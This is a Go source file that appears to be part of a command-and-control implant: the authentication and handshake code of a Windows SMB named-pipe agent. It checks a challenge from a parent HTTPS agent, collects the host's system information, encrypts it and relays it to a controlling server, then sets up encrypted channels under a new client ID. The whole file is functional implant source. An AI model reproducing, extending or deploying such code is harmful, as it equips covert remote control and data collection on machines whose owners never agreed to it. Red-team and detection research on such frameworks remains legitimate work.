// server/docker/payloads/SMB_Windows/auth.go
// Authentication and handshake for SMB agent

//go:build windows
// +build windows

package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"time"
)

// performAuth performs lightweight authentication with the connecting HTTPS agent
func performAuth(conn *PipeConnection) error {
	// Generate a random challenge
	challenge := make([]byte, 32)
	if _, err := rand.Read(challenge); err != nil {
		return fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	// Send challenge
	if err := conn.WriteMessage(challenge); err != nil {
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	// Read response
	response, err := conn.ReadMessage()
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	// Verify response format: should be "AUTH:" + challenge
	expectedPrefix := []byte("AUTH:")
	if len(response) != len(expectedPrefix)+len(challenge) {
		return fmt.Errorf(Err(E2))
	}

	for i, b := range expectedPrefix {
		if response[i] != b {
			return fmt.Errorf(Err(E3))
		}
	}

	for i, b := range challenge {
		if response[len(expectedPrefix)+i] != b {
			return fmt.Errorf(Err(E3))
		}
	}

	// Send confirmation
	if err := conn.WriteMessage([]byte("OK")); err != nil {
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	return nil
}

// performHandshake performs the RSA+AES handshake with the server via the HTTPS agent
func performHandshake(conn *PipeConnection, config map[string]string) error {
	// Collect system information
	sysInfo, err := CollectSystemInfo(clientID)
	if err != nil {
		return fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	// Encrypt system info with RSA+AES (same as HTTPS agent handshake)
	publicKey := config["Public Key"]
	initSecret := config["Secret"]

	encryptedPayload, err := encryptHandshakePayload(sysInfo, publicKey, initSecret)
	if err != nil {
		return fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	// Create handshake message to send through the HTTPS agent
	handshakeMsg := map[string]string{
		"type":    "handshake",
		"payload": encryptedPayload,
	}

	msgJSON, err := json.Marshal(handshakeMsg)
	if err != nil {
		return fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Send handshake through the pipe
	if err := conn.WriteMessage(msgJSON); err != nil {
		return fmt.Errorf(ErrCtx(E11, err.Error()))
	}

	// Wait for handshake response
	// Set a timeout for the response
	responseChan := make(chan []byte, 1)
	errChan := make(chan error, 1)

	// Read messages in a loop, skipping ping/pong and waiting for handshake_response
	go func() {
		for {
			resp, err := conn.ReadMessage()
			if err != nil {
				errChan <- err
				return
			}

			// Check if this is a ping message - if so, respond with pong and continue waiting
			var msgCheck struct {
				Type string `json:"type"`
			}
			if err := json.Unmarshal(resp, &msgCheck); err == nil {
				if msgCheck.Type == "ping" {
					pongMsg := map[string]string{"type": "pong"}
					pongJSON, _ := json.Marshal(pongMsg)
					conn.WriteMessage(pongJSON)
					continue // Keep waiting for handshake_response
				}
			}

			// Not a ping, send to response channel
			responseChan <- resp
			return
		}
	}()

	// Wait for response with timeout
	// 5-minute timeout to accommodate slow polling from parent HTTPS agent
	// The response must travel: SMB -> HTTPS -> Server -> HTTPS -> SMB
	// This can take 2-3 poll cycles of the HTTPS agent
	select {
	case response := <-responseChan:
		// Parse the response
		var respEnvelope struct {
			Type    string `json:"type"`
			Payload string `json:"payload"`
		}
		if err := json.Unmarshal(response, &respEnvelope); err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}

		if respEnvelope.Type != "handshake_response" {
			return fmt.Errorf(Err(E2))
		}

		// Decode and parse the signed response
		respBytes, err := base64.StdEncoding.DecodeString(respEnvelope.Payload)
		if err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}

		var signedResp SignedResponse
		if err := json.Unmarshal(respBytes, &signedResp); err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}

		// Verify server signature
		if err := verifyServerSignature(&signedResp, publicKey); err != nil {
			return fmt.Errorf(ErrCtx(E3, err.Error()))
		}

		// Update client ID
		if signedResp.NewClientID == "" {
			return fmt.Errorf(Err(E4))
		}
		clientID = signedResp.NewClientID

		// Initialize secure communications with derived secrets
		secret1, secret2 := generateInitialSecrets(initSecret, sysInfo.AgentInfo.Seed)
		secureComms = NewSecureComms(secret1, secret2)

		return nil

	case err := <-errChan:
		return fmt.Errorf(ErrCtx(E12, err.Error()))

	case <-time.After(300 * time.Second):
		return fmt.Errorf(Err(E6))
	}
}

// SignedResponse represents the server's signed handshake response
type SignedResponse struct {
	Status             string `json:"status"`
	NewClientID        string `json:"new_client_id"`
	SecretsInitialized bool   `json:"secrets_initialized"`
	Signature          string `json:"signature"`
	Seed               string `json:"seed"`
}
